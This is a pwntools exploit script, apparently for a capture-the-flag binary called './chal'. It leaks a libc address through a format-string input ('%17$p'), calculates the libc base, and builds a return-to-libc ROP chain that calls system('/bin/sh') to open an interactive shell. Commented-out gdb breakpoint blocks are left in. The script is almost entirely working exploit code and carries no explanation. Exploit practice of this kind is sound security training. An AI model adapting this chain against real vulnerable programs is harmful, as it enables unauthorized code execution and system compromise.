from pwn import *


target = './chal'
context.os = 'linux'
context.arch = 'amd64'
context.binary = target

binary = ELF(target)
libc = binary.libc
addr = libc.symbols['system']
arg = next(libc.search('/bin/sh\x00'))
print(libc, hex(addr), hex(arg))
gadget = 0x0002a3e5 # pop rdi; ret
offset = 72

proc = process(target)
proc.sendlineafter('🧑 > ', '%17$p')  # __libc_start_call_main+128
proc.recvuntil('🐦 > ')
b = proc.recv()[2:14].decode()
libc_base = int(b, 16) - 128 - (libc.symbols['__libc_start_main'] - 0xb0)

payload = b'A' * offset
payload += pack(0x40101a)
payload += pack(libc_base+gadget)
payload += pack(libc_base+arg)
#payload += pack(0x40101a)
payload += pack(libc_base+addr)
payload += b'AAAAAAAA'
payload += pack(libc_base+arg)

# 0x000055555555521c
# 0x0000555555555257
"""
proc = gdb.debug(target, '''
    b *0x4011da
    b *0x401201
    continue
''')
"""

"""
gdb.attach(proc, '''
    b *0x4011da
    b *0x401201
    continue
''')
"""

proc.sendline(payload)
proc.interactive()